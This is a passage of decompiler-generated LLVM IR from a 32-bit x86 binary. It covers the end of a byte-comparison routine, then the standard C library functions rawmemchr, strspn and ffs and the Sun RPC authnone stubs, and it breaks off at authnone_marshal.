  %.pre.pre-phi = phi i32 [ %.pre208, %dec_label_pc_805899e.thread ], [ %v2_805898d, %dec_label_pc_805899e ]
  %stack_var_-32.1194 = phi i32 [ %v2_80588cc, %dec_label_pc_805899e.thread ], [ %stack_var_-32.0, %dec_label_pc_805899e ]
  %v7_805899e197.in = phi i32 [ %v2_80588cc, %dec_label_pc_805899e.thread ], [ %v6_8058977, %dec_label_pc_805899e ]
  %stack_var_-36.1195 = phi i32 [ %v3_80588d0, %dec_label_pc_805899e.thread ], [ %v3_8058974, %dec_label_pc_805899e ]
  %stack_var_-24.3192 = phi i32 [ %v4_80588d5, %dec_label_pc_805899e.thread ], [ %stack_var_-24.2, %dec_label_pc_805899e ]
  %v0_80589d1188 = phi i32 [ %v1_80588dc, %dec_label_pc_805899e.thread ], [ %v0_8058974, %dec_label_pc_805899e ]
  %v0_80589d4186 = phi i32 [ %v1_80588df, %dec_label_pc_805899e.thread ], [ %v0_8058991, %dec_label_pc_805899e ]
  %v3_80589be184 = phi i32 [ %v2_80588ce, %dec_label_pc_805899e.thread ], [ %v3_8058991, %dec_label_pc_805899e ]
  %v7_805899e197 = and i32 %v7_805899e197.in, -256
  %v5_80589a6 = lshr i32 %stack_var_-32.1194, %v2_80588a7
  %v1_80589a8 = add i32 %v0_80589d1188, 12
  %v2_80589a8 = inttoptr i32 %v1_80589a8 to i32*
  %v3_80589a8 = load i32, i32* %v2_80589a8, align 4
  %v1_80589ab = add i32 %v0_80589d4186, 12
  %v2_80589ab = inttoptr i32 %v1_80589ab to i32*
  %v3_80589ab = load i32, i32* %v2_80589ab, align 4
  %v8_80589ae = or i32 %v7_805899e197, %v6_80588ae
  %v4_80589b9 = icmp eq i32 %.pre.pre-phi, 0
  br i1 %v4_80589b9, label %bb176, label %bb174

bb174:                                            ; preds = %bb173
  %v5_80589b9 = shl i32 %stack_var_-36.1195, %.pre.pre-phi
  br label %bb176

bb176:                                            ; preds = %bb173, %bb174
  %v3_80589bb = phi i32 [ %stack_var_-36.1195, %bb173 ], [ %v5_80589b9, %bb174 ]
  %v4_80589bb = or i32 %v3_80589bb, %v5_80589a6
  %v14_80589be = icmp eq i32 %v4_80589bb, %v3_80589be184
  br i1 %v14_80589be, label %dec_label_pc_80589ca, label %dec_label_pc_80589c5

dec_label_pc_80589c5:                             ; preds = %bb161, %bb176
  %v2_80589c5 = phi i32 [ %v4_80589bb, %bb176 ], [ %v4_8058944, %bb161 ]
  %storemerge9 = phi i32 [ %v3_80589be184, %bb176 ], [ %storemerge9.pre, %bb161 ]
  store i32 %storemerge9, i32* @edx, align 4
  store i32 %v2_80589c5, i32* @eax, align 4
  br label %dec_label_pc_80589f6

dec_label_pc_80589ca:                             ; preds = %bb176
  %v4_80589ca = add i32 %stack_var_-24.3192, -4
  %v12_80589ca = icmp eq i32 %v4_80589ca, 0
  br i1 %v12_80589ca, label %bb178, label %dec_label_pc_80589d1

dec_label_pc_80589d1:                             ; preds = %dec_label_pc_80589ca
  %v1_80589d1 = add i32 %v0_80589d1188, 16
  store i32 %v1_80589d1, i32* @edx, align 4
  %v1_80589d4 = add i32 %v0_80589d4186, 16
  br label %bb158

bb178:                                            ; preds = %dec_label_pc_80589ca
  %v5_80589e4 = lshr i32 %stack_var_-36.1195, %v2_80588a7
  br i1 %v4_80589b9, label %bb181, label %bb179

bb179:                                            ; preds = %bb178
  %v5_80589ea = shl i32 %v3_80589a8, %.pre.pre-phi
  br label %bb181

bb181:                                            ; preds = %bb178, %bb179
  %v1_80589ec = phi i32 [ %v3_80589a8, %bb178 ], [ %v5_80589ea, %bb179 ]
  %v2_80589ec = or i32 %v1_80589ec, %v5_80589e4
  store i32 %v2_80589ec, i32* @eax, align 4
  %v12_80589f0 = icmp eq i32 %v2_80589ec, %v3_80589ab
  br i1 %v12_80589f0, label %dec_label_pc_80589ff.thread209, label %dec_label_pc_80589f4

dec_label_pc_80589ff.thread209:                   ; preds = %bb181
  br label %dec_label_pc_8058a03

dec_label_pc_80589f4:                             ; preds = %bb181
  store i32 %v3_80589ab, i32* @edx, align 4
  br label %dec_label_pc_80589f6

dec_label_pc_80589f6:                             ; preds = %dec_label_pc_80589c5, %dec_label_pc_805899a, %dec_label_pc_80589f4
  %v0_80589f6 = call i32 @memcmp_bytes()
  store i32 %v0_80589f6, i32* @ecx, align 4
  br label %dec_label_pc_80589ff

dec_label_pc_80589ff:                             ; preds = %dec_label_pc_80589f6, %dec_label_pc_805888e
  %storemerge = phi i32 [ %v0_805888e, %dec_label_pc_805888e ], [ %v0_80589f6, %dec_label_pc_80589f6 ]
  %v1_80589ff = icmp eq i32 %storemerge, 0
  %v1_8058a01 = icmp eq i1 %v1_80589ff, false
  br i1 %v1_8058a01, label %dec_label_pc_8058a38, label %dec_label_pc_8058a03

dec_label_pc_8058a03:                             ; preds = %dec_label_pc_80589ff.thread209, %dec_label_pc_80589ff.thread, %dec_label_pc_80589ff
  %v4_8058a0b = urem i32 %stack_var_12.0.lcssa, 4
  %v1_8058a10 = and i32 %stack_var_12.0.lcssa, -4
  %v2_8058a17 = add i32 %v1_8058a10, %v0_80588ba
  store i32 %v2_8058a17, i32* @ecx, align 4
  %v2_8058a19 = add i32 %v1_8058a10, %v0_8058924
  br label %dec_label_pc_8058a2f.preheader

dec_label_pc_8058a2f.preheader:                   ; preds = %dec_label_pc_8058a03, %entry
  %v0_8058a20122 = phi i32 [ %v4_80587a2, %entry ], [ %v2_8058a17, %dec_label_pc_8058a03 ]
  %v0_8058a1d120 = phi i32 [ %v4_80587a6, %entry ], [ %v2_8058a19, %dec_label_pc_8058a03 ]
  %stack_var_12.1.ph = phi i32 [ %tmp149, %entry ], [ %v4_8058a0b, %dec_label_pc_8058a03 ]
  %v4_8058a2f38 = icmp eq i32 %stack_var_12.1.ph, 0
  %v1_8058a3445 = icmp eq i1 %v4_8058a2f38, false
  br i1 %v1_8058a3445, label %dec_label_pc_8058a1d, label %dec_label_pc_8058a36

dec_label_pc_8058a1d:                             ; preds = %dec_label_pc_8058a2f.preheader, %dec_label_pc_8058a29
  %v0_8058a2d = phi i32 [ %v1_8058a2d, %dec_label_pc_8058a29 ], [ %v0_8058a20122, %dec_label_pc_8058a2f.preheader ]
  %v0_8058a2e = phi i32 [ %v1_8058a2e, %dec_label_pc_8058a29 ], [ %v0_8058a1d120, %dec_label_pc_8058a2f.preheader ]
  %stack_var_12.146 = phi i32 [ %v4_8058a29, %dec_label_pc_8058a29 ], [ %stack_var_12.1.ph, %dec_label_pc_8058a2f.preheader ]
  %v1_8058a1d = inttoptr i32 %v0_8058a2e to i8*
  %v2_8058a1d = load i8, i8* %v1_8058a1d, align 1
  %v3_8058a1d = zext i8 %v2_8058a1d to i32
  %v1_8058a20 = inttoptr i32 %v0_8058a2d to i8*
  %v2_8058a20 = load i8, i8* %v1_8058a20, align 1
  %v3_8058a20 = zext i8 %v2_8058a20 to i32
  %v2_8058a23 = sub nsw i32 %v3_8058a20, %v3_8058a1d
  %v12_8058a23 = icmp eq i32 %v2_8058a23, 0
  store i32 %v2_8058a23, i32* @edx, align 4
  %v1_8058a27 = icmp eq i1 %v12_8058a23, false
  br i1 %v1_8058a27, label %dec_label_pc_8058a38, label %dec_label_pc_8058a29

dec_label_pc_8058a29:                             ; preds = %dec_label_pc_8058a1d
  %v4_8058a29 = add i32 %stack_var_12.146, -1
  %v11_8058a29 = icmp eq i32 %v4_8058a29, 0
  %v1_8058a2d = add i32 %v0_8058a2d, 1
  store i32 %v1_8058a2d, i32* @ecx, align 4
  %v1_8058a2e = add i32 %v0_8058a2e, 1
  %v1_8058a34 = icmp eq i1 %v11_8058a29, false
  br i1 %v1_8058a34, label %dec_label_pc_8058a1d, label %dec_label_pc_8058a36

dec_label_pc_8058a36:                             ; preds = %dec_label_pc_8058a29, %dec_label_pc_8058a2f.preheader
  br label %dec_label_pc_8058a38

dec_label_pc_8058a38:                             ; preds = %dec_label_pc_80587b6, %dec_label_pc_8058a1d, %dec_label_pc_80589ff, %dec_label_pc_8058a36
  %v0_8058a3f = phi i32 [ %storemerge, %dec_label_pc_80589ff ], [ 0, %dec_label_pc_8058a36 ], [ %v2_8058a23, %dec_label_pc_8058a1d ], [ %v2_80587bc, %dec_label_pc_80587b6 ]
  store i32 %v0_805879e, i32* @ebx, align 4
  ret i32 %v0_8058a3f

; uselistorder directives
  uselistorder i32 %v1_8058a2d, { 1, 0 }
  uselistorder i32 %v4_8058a29, { 1, 0 }
  uselistorder i32 %v1_8058a10, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_80589d1, { 1, 0 }
  uselistorder i32 %v4_80589ca, { 1, 0 }
  uselistorder i32 %v4_80589bb, { 1, 0 }
  uselistorder i32 %v3_80589ab, { 2, 0, 1 }
  uselistorder i32 %v3_80589a8, { 1, 2, 0 }
  uselistorder i32 %v3_80589be184, { 1, 0 }
  uselistorder i32 %v0_80589d4186, { 1, 0 }
  uselistorder i32 %v0_80589d1188, { 1, 0 }
  uselistorder i32 %stack_var_-36.1195, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805898f, { 1, 0 }
  uselistorder i32 %storemerge11.pre, { 1, 0 }
  uselistorder i32 %v2_805896a, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i32 %v1_805896c, { 1, 0 }
  uselistorder i32 %v4_8058944, { 1, 0 }
  uselistorder i32 %storemerge9.pre, { 1, 0 }
  uselistorder i32 %v3_8058902, { 1, 0 }
  uselistorder i32 %v2_80588cc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80588bf, { 0, 1, 3, 2, 5, 4, 6, 7, 8, 9 }
  uselistorder i32 %v1_80588bc, { 2, 0, 1 }
  uselistorder i32 %v6_80588ae, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 %v2_80588a7, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32 %v1_805886f, { 1, 0 }
  uselistorder i32 %v3_805886a, { 1, 0, 2 }
  uselistorder i32 %v3_805885f, { 1, 0, 2 }
  uselistorder i32 %v0_8058868, { 1, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v0_8058857, { 1, 0 }
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32 %storemerge25.in, { 0, 2, 1 }
  uselistorder i32 %v4_8058837, { 1, 0 }
  uselistorder i32 %v1_80587ed, { 2, 0, 1 }
  uselistorder i32 %v2_80588a4, { 4, 5, 2, 3, 0, 6, 7, 8, 9, 1 }
  uselistorder i32 %v0_8058924, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i32 %stack_var_12.0.lcssa, { 2, 0, 1 }
  uselistorder i32 %v0_80588ba, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 %v1_80587cb, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80587ca, { 0, 2, 1 }
  uselistorder i32 %v4_80587a6, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_80587a2, { 2, 1, 0, 3 }
  uselistorder i32 %tmp149, { 2, 1, 0, 3 }
  uselistorder i32 ()* @memcmp_bytes, { 1, 0 }
  uselistorder i32 -8, { 56, 57, 58, 59, 63, 60, 64, 13, 7, 6, 8, 5, 9, 10, 11, 12, 62, 14, 15, 16, 17, 19, 20, 18, 21, 22, 23, 24, 25, 26, 27, 67, 65, 66, 61, 33, 34, 28, 29, 30, 31, 32, 35, 36, 37, 38, 47, 46, 0, 41, 1, 42, 43, 44, 45, 39, 40, 48, 49, 51, 50, 52, 53, 2, 3, 54, 4, 55 }
  uselistorder label %dec_label_pc_8058a38, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8058a1d, { 1, 0 }
  uselistorder label %dec_label_pc_8058a03, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80589f6, { 2, 0, 1 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %dec_label_pc_80589c5, { 1, 0 }
  uselistorder label %bb176, { 1, 0 }
  uselistorder label %bb173, { 1, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_805888e, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80587b6, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8058a41 = load i32, i32* @ebx, align 4
  %v4_8058a42 = urem i32 %arg2, 256
  %v4_8058a46 = ptrtoint i8* %arg1 to i32
  %v2_8058a513 = urem i32 %v4_8058a46, 4
  %v3_8058a514 = icmp eq i32 %v2_8058a513, 0
  %v1_8058a538 = icmp eq i1 %v3_8058a514, false
  %v4_8058a4c = trunc i32 %arg2 to i8
  br i1 %v1_8058a538, label %dec_label_pc_8058a4c, label %dec_label_pc_8058a55

dec_label_pc_8058a4c:                             ; preds = %entry, %dec_label_pc_8058a50
  %v0_8058a50 = phi i32 [ %v1_8058a50, %dec_label_pc_8058a50 ], [ %v4_8058a46, %entry ]
  %v1_8058a4c = inttoptr i32 %v0_8058a50 to i8*
  %v2_8058a4c = load i8, i8* %v1_8058a4c, align 1
  %v15_8058a4c = icmp eq i8 %v2_8058a4c, %v4_8058a4c
  br i1 %v15_8058a4c, label %dec_label_pc_8058aa0, label %dec_label_pc_8058a50

dec_label_pc_8058a50:                             ; preds = %dec_label_pc_8058a4c
  %v1_8058a50 = add i32 %v0_8058a50, 1
  %v2_8058a51 = urem i32 %v1_8058a50, 4
  %v3_8058a51 = icmp eq i32 %v2_8058a51, 0
  %v1_8058a53 = icmp eq i1 %v3_8058a51, false
  br i1 %v1_8058a53, label %dec_label_pc_8058a4c, label %dec_label_pc_8058a55

dec_label_pc_8058a55:                             ; preds = %entry, %dec_label_pc_8058a50
  %v0_8058a58 = phi i32 [ %v1_8058a50, %dec_label_pc_8058a50 ], [ %v4_8058a46, %entry ]
  %v2_8058a5c = mul nuw nsw i32 %v4_8058a42, 256
  %v2_8058a5f = or i32 %v2_8058a5c, %v4_8058a42
  %v2_8058a63 = mul i32 %v2_8058a5f, 65536
  %v2_8058a66 = or i32 %v2_8058a63, %v2_8058a5f
  br label %dec_label_pc_8058a68

dec_label_pc_8058a68:                             ; preds = %dec_label_pc_8058a98, %dec_label_pc_8058a68, %dec_label_pc_8058a55
  %v0_8058a6c = phi i32 [ %v0_8058a58, %dec_label_pc_8058a55 ], [ %v1_8058a6c, %dec_label_pc_8058a68 ], [ %v1_8058a6c, %dec_label_pc_8058a98 ]
  %v2_8058a6a = inttoptr i32 %v0_8058a6c to i32*
  %v3_8058a6a = load i32, i32* %v2_8058a6a, align 4
  %v4_8058a6a = xor i32 %v3_8058a6a, %v2_8058a66
  %v1_8058a6c = add i32 %v0_8058a6c, 4
  %v1_8058a6f = add i32 %v4_8058a6a, 2130640639
  %v1_8058a75 = sub i32 -1, %v4_8058a6a
  %v2_8058a77 = xor i32 %v1_8058a6f, %v1_8058a75
  %v1_8058a79 = and i32 %v2_8058a77, -2130640640
  %v2_8058a79 = icmp eq i32 %v1_8058a79, 0
  br i1 %v2_8058a79, label %dec_label_pc_8058a68, label %dec_label_pc_8058a80

dec_label_pc_8058a80:                             ; preds = %dec_label_pc_8058a68
  %v2_8058a83 = inttoptr i32 %v0_8058a6c to i8*
  %v3_8058a83 = load i8, i8* %v2_8058a83, align 1
  %v16_8058a83 = icmp eq i8 %v3_8058a83, %v4_8058a4c
  br i1 %v16_8058a83, label %dec_label_pc_8058aa0, label %dec_label_pc_8058a88

dec_label_pc_8058a88:                             ; preds = %dec_label_pc_8058a80
  %v1_8058a88 = add i32 %v0_8058a6c, 1
  %v2_8058a8b = inttoptr i32 %v1_8058a88 to i8*
  %v3_8058a8b = load i8, i8* %v2_8058a8b, align 1
  %v16_8058a8b = icmp eq i8 %v3_8058a8b, %v4_8058a4c
  br i1 %v16_8058a8b, label %dec_label_pc_8058aa0, label %dec_label_pc_8058a90

dec_label_pc_8058a90:                             ; preds = %dec_label_pc_8058a88
  %v1_8058a90 = add i32 %v0_8058a6c, 2
  %v2_8058a93 = inttoptr i32 %v1_8058a90 to i8*
  %v3_8058a93 = load i8, i8* %v2_8058a93, align 1
  %v16_8058a93 = icmp eq i8 %v3_8058a93, %v4_8058a4c
  br i1 %v16_8058a93, label %dec_label_pc_8058aa0, label %dec_label_pc_8058a98

dec_label_pc_8058a98:                             ; preds = %dec_label_pc_8058a90
  %v1_8058a98 = add i32 %v0_8058a6c, 3
  %v2_8058a9b = inttoptr i32 %v1_8058a98 to i8*
  %v3_8058a9b = load i8, i8* %v2_8058a9b, align 1
  %v16_8058a9b = icmp eq i8 %v3_8058a9b, %v4_8058a4c
  %v1_8058a9e = icmp eq i1 %v16_8058a9b, false
  br i1 %v1_8058a9e, label %dec_label_pc_8058a68, label %dec_label_pc_8058aa0

dec_label_pc_8058aa0:                             ; preds = %dec_label_pc_8058a4c, %dec_label_pc_8058a98, %dec_label_pc_8058a90, %dec_label_pc_8058a88, %dec_label_pc_8058a80
  %v0_8058aa2 = phi i32 [ %v1_8058a98, %dec_label_pc_8058a98 ], [ %v1_8058a90, %dec_label_pc_8058a90 ], [ %v1_8058a88, %dec_label_pc_8058a88 ], [ %v0_8058a6c, %dec_label_pc_8058a80 ], [ %v0_8058a50, %dec_label_pc_8058a4c ]
  store i32 %v0_8058a41, i32* @ebx, align 4
  ret i32 %v0_8058aa2

; uselistorder directives
  uselistorder i32 %v1_8058a6c, { 1, 0 }
  uselistorder i32 %v2_8058a5f, { 1, 0 }
  uselistorder i32 %v1_8058a50, { 1, 0, 2 }
  uselistorder i8 %v4_8058a4c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8058a46, { 2, 1, 0 }
  uselistorder i32 %v4_8058a42, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8058aa0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8058a55, { 1, 0 }
  uselistorder label %dec_label_pc_8058a4c, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8058ac630 = load i8, i8* %arg1, align 1
  %v4_8058ac834 = icmp eq i8 %v2_8058ac630, 0
  br i1 %v4_8058ac834, label %dec_label_pc_8058ad0, label %dec_label_pc_8058acc.lr.ph

dec_label_pc_8058acc.lr.ph:                       ; preds = %entry
  %v3_8058ac631 = zext i8 %v2_8058ac630 to i32
  %v4_8058ac6.pre = load i32, i32* @eax, align 4
  %v5_8058ac632 = and i32 %v4_8058ac6.pre, -256
  %v6_8058ac633 = or i32 %v3_8058ac631, %v5_8058ac632
  %v4_8058aad = ptrtoint i8* %arg1 to i32
  %v1_8058ab818 = inttoptr i32 %arg2 to i8*
  %v4_8058ab8.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8058acc

dec_label_pc_8058ab3:                             ; preds = %dec_label_pc_8058acc, %dec_label_pc_8058ab7
  %v6_8058ab827 = phi i32 [ %v6_8058ab8, %dec_label_pc_8058ab7 ], [ %v6_8058ab822, %dec_label_pc_8058acc ]
  %v2_8058ab826 = phi i8 [ %v2_8058ab8, %dec_label_pc_8058ab7 ], [ %v2_8058ab819, %dec_label_pc_8058acc ]
  %v0_8058ab725 = phi i32 [ %v1_8058ab7, %dec_label_pc_8058ab7 ], [ %arg2, %dec_label_pc_8058acc ]
  %v15_8058ab3 = icmp eq i8 %v2_8058ac637, %v2_8058ab826
  br i1 %v15_8058ab3, label %dec_label_pc_8058ac0, label %dec_label_pc_8058ab7

dec_label_pc_8058ab7:                             ; preds = %dec_label_pc_8058ab3
  %v1_8058ab7 = add i32 %v0_8058ab725, 1
  store i32 %v1_8058ab7, i32* @edx, align 4
  %v1_8058ab8 = inttoptr i32 %v1_8058ab7 to i8*
  %v2_8058ab8 = load i8, i8* %v1_8058ab8, align 1
  %v3_8058ab8 = zext i8 %v2_8058ab8 to i32
  %v5_8058ab8 = and i32 %v6_8058ab827, -256
  %v6_8058ab8 = or i32 %v3_8058ab8, %v5_8058ab8
  store i32 %v6_8058ab8, i32* @ecx, align 4
  %v4_8058aba = icmp eq i8 %v2_8058ab8, 0
  %v1_8058abc = icmp eq i1 %v4_8058aba, false
  br i1 %v1_8058abc, label %dec_label_pc_8058ab3, label %dec_label_pc_8058ad0

dec_label_pc_8058ac0:                             ; preds = %dec_label_pc_8058ab3
  %v1_8058ac4 = add i32 %v0_8058ad035, 1
  %v1_8058ac5 = add i32 %v0_8058ac536, 1
  %v1_8058ac6 = inttoptr i32 %v1_8058ac5 to i8*
  %v2_8058ac6 = load i8, i8* %v1_8058ac6, align 1
  %v3_8058ac6 = zext i8 %v2_8058ac6 to i32
  %v5_8058ac6 = and i32 %v6_8058ac638, -256
  %v6_8058ac6 = or i32 %v3_8058ac6, %v5_8058ac6
  %v4_8058ac8 = icmp eq i8 %v2_8058ac6, 0
  br i1 %v4_8058ac8, label %dec_label_pc_8058ad0, label %dec_label_pc_8058acc

dec_label_pc_8058acc:                             ; preds = %dec_label_pc_8058acc.lr.ph, %dec_label_pc_8058ac0
  %v4_8058ab8.pre = phi i32 [ %v4_8058ab8.pre.pre, %dec_label_pc_8058acc.lr.ph ], [ %v6_8058ab827, %dec_label_pc_8058ac0 ]
  %v6_8058ac638 = phi i32 [ %v6_8058ac633, %dec_label_pc_8058acc.lr.ph ], [ %v6_8058ac6, %dec_label_pc_8058ac0 ]
  %v2_8058ac637 = phi i8 [ %v2_8058ac630, %dec_label_pc_8058acc.lr.ph ], [ %v2_8058ac6, %dec_label_pc_8058ac0 ]
  %v0_8058ac536 = phi i32 [ %v4_8058aad, %dec_label_pc_8058acc.lr.ph ], [ %v1_8058ac5, %dec_label_pc_8058ac0 ]
  %v0_8058ad035 = phi i32 [ 0, %dec_label_pc_8058acc.lr.ph ], [ %v1_8058ac4, %dec_label_pc_8058ac0 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8058ab819 = load i8, i8* %v1_8058ab818, align 1
  %v3_8058ab820 = zext i8 %v2_8058ab819 to i32
  %v5_8058ab821 = and i32 %v4_8058ab8.pre, -256
  %v6_8058ab822 = or i32 %v3_8058ab820, %v5_8058ab821
  store i32 %v6_8058ab822, i32* @ecx, align 4
  %v4_8058aba23 = icmp eq i8 %v2_8058ab819, 0
  %v1_8058abc24 = icmp eq i1 %v4_8058aba23, false
  br i1 %v1_8058abc24, label %dec_label_pc_8058ab3, label %dec_label_pc_8058ad0

dec_label_pc_8058ad0:                             ; preds = %entry, %dec_label_pc_8058ac0, %dec_label_pc_8058acc, %dec_label_pc_8058ab7
  %v0_8058ad017 = phi i32 [ %v0_8058ad035, %dec_label_pc_8058ab7 ], [ %v0_8058ad035, %dec_label_pc_8058acc ], [ 0, %entry ], [ %v1_8058ac4, %dec_label_pc_8058ac0 ]
  ret i32 %v0_8058ad017

; uselistorder directives
  uselistorder i32 %v6_8058ab822, { 1, 0 }
  uselistorder i8 %v2_8058ab819, { 1, 2, 0 }
  uselistorder i32 %v1_8058ac5, { 1, 0 }
  uselistorder i32 %v6_8058ab8, { 1, 0 }
  uselistorder i8 %v2_8058ab8, { 1, 2, 0 }
  uselistorder i32 %v1_8058ab7, { 2, 1, 0 }
  uselistorder i8 %v2_8058ac630, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8058ad0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8058acc, { 1, 0 }
}

define i32 @ffs(i16 %arg1) local_unnamed_addr {
entry:
  %v4_8058ad8 = sext i16 %arg1 to i32
  %v0_8058adc = load i32, i32* @edx, align 4
  %v1_8058adc = and i32 %v0_8058adc, -256
  %v2_8058adc = or i32 %v1_8058adc, 1
  %v4_8058ade = icmp eq i16 %arg1, 0
  %v1_8058ae1 = icmp eq i1 %v4_8058ade, false
  br i1 %v1_8058ae1, label %dec_label_pc_8058ae8, label %dec_label_pc_8058ae3

dec_label_pc_8058ae3:                             ; preds = %entry
  %v2_8058ae3 = sdiv i32 %v4_8058ad8, 65536
  %v2_8058ae6 = or i32 %v1_8058adc, 17
  br label %dec_label_pc_8058ae8

dec_label_pc_8058ae8:                             ; preds = %entry, %dec_label_pc_8058ae3
  %storemerge = phi i32 [ %v2_8058ae6, %dec_label_pc_8058ae3 ], [ %v2_8058adc, %entry ]
  %v0_8058aef = phi i32 [ %v2_8058ae6, %dec_label_pc_8058ae3 ], [ %v2_8058adc, %entry ]
  %v0_8058aec = phi i32 [ %v2_8058ae3, %dec_label_pc_8058ae3 ], [ %v4_8058ad8, %entry ]
  %v3_8058ae8 = trunc i32 %v0_8058aec to i8
  %v4_8058ae8 = icmp eq i8 %v3_8058ae8, 0
  %v1_8058aea = icmp eq i1 %v4_8058ae8, false
  br i1 %v1_8058aea, label %dec_label_pc_8058af2, label %dec_label_pc_8058aec

dec_label_pc_8058aec:                             ; preds = %dec_label_pc_8058ae8
  %v2_8058aec = sdiv i32 %v0_8058aec, 256
  %v1_8058aef = add i32 %v0_8058aef, 8
  br label %dec_label_pc_8058af2

dec_label_pc_8058af2:                             ; preds = %dec_label_pc_8058ae8, %dec_label_pc_8058aec
  %storemerge10 = phi i32 [ %v1_8058aef, %dec_label_pc_8058aec ], [ %storemerge, %dec_label_pc_8058ae8 ]
  %v0_8058af9 = phi i32 [ %v1_8058aef, %dec_label_pc_8058aec ], [ %v0_8058aef, %dec_label_pc_8058ae8 ]
  %v0_8058af6 = phi i32 [ %v2_8058aec, %dec_label_pc_8058aec ], [ %v0_8058aec, %dec_label_pc_8058ae8 ]
  %v2_8058af2 = urem i32 %v0_8058af6, 16
  %v3_8058af2 = icmp eq i32 %v2_8058af2, 0
  %v1_8058af4 = icmp eq i1 %v3_8058af2, false
  br i1 %v1_8058af4, label %dec_label_pc_8058afc, label %dec_label_pc_8058af6

dec_label_pc_8058af6:                             ; preds = %dec_label_pc_8058af2
  %v2_8058af6 = sdiv i32 %v0_8058af6, 16
  %v1_8058af9 = add i32 %v0_8058af9, 4
  br label %dec_label_pc_8058afc

dec_label_pc_8058afc:                             ; preds = %dec_label_pc_8058af2, %dec_label_pc_8058af6
  %storemerge11 = phi i32 [ %v1_8058af9, %dec_label_pc_8058af6 ], [ %storemerge10, %dec_label_pc_8058af2 ]
  %v0_8058b03 = phi i32 [ %v1_8058af9, %dec_label_pc_8058af6 ], [ %v0_8058af9, %dec_label_pc_8058af2 ]
  %v0_8058b00 = phi i32 [ %v2_8058af6, %dec_label_pc_8058af6 ], [ %v0_8058af6, %dec_label_pc_8058af2 ]
  %v2_8058afc = urem i32 %v0_8058b00, 4
  %v3_8058afc = icmp eq i32 %v2_8058afc, 0
  %v1_8058afe = icmp eq i1 %v3_8058afc, false
  br i1 %v1_8058afe, label %dec_label_pc_8058b06, label %dec_label_pc_8058b00

dec_label_pc_8058b00:                             ; preds = %dec_label_pc_8058afc
  %v2_8058b00 = sdiv i32 %v0_8058b00, 4
  %v1_8058b03 = add i32 %v0_8058b03, 2
  br label %dec_label_pc_8058b06

dec_label_pc_8058b06:                             ; preds = %dec_label_pc_8058afc, %dec_label_pc_8058b00
  %storemerge12 = phi i32 [ %v1_8058b03, %dec_label_pc_8058b00 ], [ %storemerge11, %dec_label_pc_8058afc ]
  %v0_8058b0d = phi i32 [ %v1_8058b03, %dec_label_pc_8058b00 ], [ %v0_8058b03, %dec_label_pc_8058afc ]
  %v0_8058b0c = phi i32 [ %v2_8058b00, %dec_label_pc_8058b00 ], [ %v0_8058b00, %dec_label_pc_8058afc ]
  store i32 %storemerge12, i32* @edx, align 4
  store i32 0, i32* @ecx, align 4
  %v1_8058b08 = icmp eq i32 %v0_8058b0c, 0
  br i1 %v1_8058b08, label %dec_label_pc_8058b16, label %dec_label_pc_8058b0c

dec_label_pc_8058b0c:                             ; preds = %dec_label_pc_8058b06
  %v1_8058b0d = mul i32 %v0_8058b0d, 16777216
  %v2_8058b0d = sdiv i32 %v1_8058b0d, 16777216
  store i32 %v2_8058b0d, i32* @edx, align 4
  %v1_8058b0c = urem i32 %v0_8058b0c, 2
  %v1_8058b10 = xor i32 %v1_8058b0c, 1
  %v2_8058b13 = add nsw i32 %v1_8058b10, %v2_8058b0d
  store i32 %v2_8058b13, i32* @ecx, align 4
  br label %dec_label_pc_8058b16

dec_label_pc_8058b16:                             ; preds = %dec_label_pc_8058b06, %dec_label_pc_8058b0c
  %v0_8058b16 = phi i32 [ 0, %dec_label_pc_8058b06 ], [ %v2_8058b13, %dec_label_pc_8058b0c ]
  ret i32 %v0_8058b16

; uselistorder directives
  uselistorder i32 %v2_8058b0d, { 1, 0 }
  uselistorder label %dec_label_pc_8058b16, { 1, 0 }
  uselistorder label %dec_label_pc_8058b06, { 1, 0 }
  uselistorder label %dec_label_pc_8058afc, { 1, 0 }
  uselistorder label %dec_label_pc_8058af2, { 1, 0 }
  uselistorder label %dec_label_pc_8058ae8, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v0_8058b1c = load i32, i32* @eax, align 4
  ret i32 %v0_8058b1c
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v0_8058b26 = load i32, i32* @eax, align 4
  ret i32 %v0_8058b26
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
